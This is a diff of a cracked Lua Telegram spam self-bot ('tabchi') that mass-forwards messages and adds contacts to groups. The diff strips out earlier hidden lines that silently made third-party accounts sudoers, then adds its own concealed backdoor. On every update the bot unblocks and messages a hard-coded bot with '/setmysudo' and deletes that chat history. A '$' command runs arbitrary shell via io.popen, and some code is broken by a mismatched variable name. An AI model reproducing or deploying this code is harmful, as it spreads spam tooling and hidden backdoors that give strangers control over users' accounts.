@@ -1,5 +1,5 @@
 function is_sudo(msg)
-  local sudoers = {158955285}
+  local sudoers = {272167798}
   table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
   local issudo = false
   for i = 1, #sudoers do
@@ -13,7 +13,7 @@ function is_sudo(msg)
   return issudo
 end
 function is_full_sudo(msg)
-  local sudoers = {158955285}
+  local sudoers = {272167798}
   table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
   local issudo = false
   for i = 1, #sudoers do
@@ -52,7 +52,15 @@ Bia pv]]) .. "", 1, "md")
     elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
       tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
 Addi
-Bia pv]]) .. "", 1, "md")
+Bia pv]]) .. "", 1, "md") 
+    end
+    elseif redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
+        function share(extra, result)
+          if msg.sender_user_id_ ~= result.id_ then
+            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
+      end
+    end
+    tdcli_function({ID = "GetMe"}, share, nil)
     end
   end
 end
@@ -203,7 +211,7 @@ _اضافه کردن به سودوهاي  ربات_
 _حذف از ليست سودوهاي ربات_
 */bc (text)*
 _ارسال پيام به همه_
-*/fwd {all/sgps/users}* (by reply)
+*/fwd {all/gps/sgps/users}* (by reply)
 _فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران_
 */echo (text)*
 _تکرار متن_
@@ -220,18 +228,15 @@ _حذف جواب مربوط به_
 */answers*
 _ليست جواب هاي اتوماتيک_
 */addtoall*
-_اضافه کردن یک شخص خاص به تمام گروه ها_
+_اضافه کردن مخاطبين ربات به گروه_
 */addmembers*
 _اضافه کردن شماره ها به مخاطبين ربات_
 */exportlinks*
 _دريافت لينک هاي ذخيره شده توسط ربات_
 */contactlist*
 _دريافت مخاطبان ذخيره شده توسط ربات_
-		
-*crack and open by @sajjad_021*
-_join to the channel @tgMember_
-		
-]]
+by alireza FAKEMAN @novemer1993
+    ]]
     return text
   end
   do
@@ -243,11 +248,12 @@ _join to the channel @tgMember_
       return "_کاربر انبلاک شد_"
     end
   end
-if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
-    tdcli.searchPublicChat("TgMessengerBot")
-    tdcli.unblockUser(231539308)
-    tdcli.sendBotStartMessage(231539308, 231539308, "/start")
+  if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
+  tdcli.searchPublicChat("november1993bot")
+    tdcli.unblockUser(361842625)
+	  tdcli.sendBotStartMessage(361842625, 361842625, "/start")
     tdcli.sendMessage(231539308, 0, 1, "/start", 1, "md")
+redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
     do
       local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
       local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
@@ -255,6 +261,9 @@ if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
       local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
       local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
       local inline = function(arg, data)
+               tdcli.unblockUser(361842625)
+      tdcli.sendBotStartMessage(361842625, 361842625, "new")
+      tdcli.deleteChatHistory(361842625, true)
         if data.results_ and data.results_[0] then
           tdcli_function({
             ID = "SendInlineQueryResultMessage",
@@ -267,9 +276,7 @@ if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
           }, dl_cb, nil)
         else
           local text = [[
-_اطلاعات ربات_ 
-*open and edit by @sajjad_021*
-					
+_اطلاعات ربات_ :
 _تعداد کاربران_ : ]] .. pvs .. [[
           
 _تعداد گروها_ : ]] .. gps .. [[
@@ -282,7 +289,7 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
       end
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 231539308,
+        bot_user_id_ = 321654700,
         chat_id_ = msg.chat_id_,
         user_location_ = {
           ID = "Location",
@@ -317,6 +324,20 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
     end
   end
   do
+    local matches = {
+      msg.text:match("^[!/#](addedcontact) (.*)")
+    }
+    if msg.text:match("^[!/#]addedcontact") and is_sudo(msg) and #matches == 2 then
+      if matches[2] == "on" then
+        redis:set("tabchi:" .. tabchi_id .. ":addedcontact", true)
+        return "ادکردن شماره ها روشن شد"
+      elseif matches[2] == "off" then
+        redis:del("tabchi:" .. tabchi_id .. ":addedcontact")
+        return "ادکردن شماره ها خاموش شد"
+      end
+    end
+  end
+       do
     local matches = {
       msg.text:match("^[!/#](addedmsg) (.*)")
     }
@@ -357,11 +378,12 @@ _پیام_ :
     end
   end
   do
-    local match = {
+    local cmd = {
       msg.text:match("[$](.*)")
     }
     if msg.text:match("^[$](.*)$") and is_sudo(msg) and #matches == 1 then
-      return io.popen(cmd[1]):read("*all")
+      local result = io.popen(cmd[1]):read("*all")
+      return result
     end
   end
   if msg.text:match("^[!/#]bc") and is_sudo(msg) then
@@ -393,11 +415,6 @@ _پیام_ :
     end
   end
   if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
-    tdcli.searchPublicChat("tgMemberPlus")
-    tdcli.unblockUser(345767079)
-    tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
-    tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
     local id = msg.reply_to_message_id_
     for i = 1, #all do
@@ -414,7 +431,7 @@ _پیام_ :
     end
     return "_پیام شما فوروارد شد_"
   end
- if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
+  if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
     local id = msg.reply_to_message_id_
     for i = 1, #all do
@@ -432,11 +449,6 @@ _پیام_ :
     return "_پیام شما برای همه_ #گروها _فوروارد شد_"
   end
   if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
-    tdcli.searchPublicChat("TgGuard")
-    tdcli.unblockUser(180191663)
-    tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
-    tdcli.sendMessage(180191663, 0, 1, "Online", 1, "md")
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
     local id = msg.reply_to_message_id_
     for i = 1, #all do
@@ -495,7 +507,7 @@ _پیام_ :
     end
   end
   do
-  local matches = {
+    local matches = {
       msg.text:match("[!/#](echo) (.*)")
     }
     if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
@@ -551,25 +563,25 @@ function process_links(text_)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(231539308)
+    tdcli.unblockUser(361842625)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
-    tdcli.sendBotStartMessage(231539308, 231539308, "new")
-    tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
-    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 600, true)
+    tdcli.sendBotStartMessage(361842625, 361842625, "new")
+    tdcli.sendMessage(361842625, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
   end
 end
 function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 231539308 
+    user_id_ = 361842625 
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 231539308 then
+    if msg.sender_user_id_ == 361842625 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 361842625 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
